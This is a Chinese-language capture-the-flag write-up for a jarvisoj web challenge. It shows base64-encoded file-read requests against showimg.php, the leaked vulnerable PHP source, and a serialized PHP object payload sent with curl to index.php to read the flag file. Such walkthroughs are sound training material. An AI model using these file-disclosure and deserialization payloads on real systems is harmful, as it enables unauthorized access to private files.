# jarvisoj.com -- WEB -- 神盾局的秘密

## Challenge

```
这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？

题目入口：http://web.jarvisoj.com:32768/
```

## Solution

打开网页，只有一张图片。在浏览器调试控制台里看下网页的html代码：

```html
<html>
    <head></head>
    <body cz-shortcut-listen="true">
        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%">
    </body>
</html>
```

这个图片的地址很令人玩味，我们用base64解码 `c2hpZWxkLmpwZw==` 可以得到 `shield.jpg`。这里我们可以怀疑有任意文件读取漏洞。

我们不妨试试读取 `showimg.php`：

```console
$ curl http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=
<?php
        $f = $_GET['img'];
        if (!empty($f)) {
                $f = base64_decode($f);
                if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
                && stripos($f,'pctf')===FALSE) {
                        readfile($f);
                } else {
                        echo "File not found!";
                }
        }
?>
```

这一点可以证实我们的猜测。我们不妨再去读取 `index.php` 看看：

```console
$ curl http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 
<?php
        require_once('shield.php');
        $x = new Shield();
        isset($_GET['class']) && $g = $_GET['class'];
        if (!empty($g)) {
                $x = unserialize($g);
        }
        echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```

可以发现这里似乎有一个反序列化漏洞。同时我们再看看 `shield.php`：

```console
$ curl http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==
<?php
        //flag is in pctf.php
        class Shield {
                public $file;
                function __construct($filename = '') {
                        $this -> file = $filename;
                }

                function readfile() {
                        if (!empty($this->file) && stripos($this->file,'..')===FALSE
                        && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                                return @file_get_contents($this->file);
                        }
                }
        }
?>
```

这样一来我们不妨把 `new Shield('pctf.php')` 给序列化，然后传给 `index.php`。

序列化后的 `new Shield('pctf.php')` 可以通过下面这个方法获得：

```php
<?php
class Shield {
    public $file;

    function __construct($filename = '') {
        $this -> file = $filename;
    }

    function readfile() {
        if (!empty($this->file) && stripos($this->file,'..')===FALSE && stripos($this->file,'/')===FALSE && stripos($this->file,'')==FALSE) {
            return @file_get_contents($this->file);
        }
    }
}

echo serialize(new Shield('pctf.php'));
```

可以得到 `class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`。

然后用curl就可以得到flag：

```console
$ curl -G 'http://web.jarvisoj.com:32768/index.php' --data-urlencode 'class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}'
```

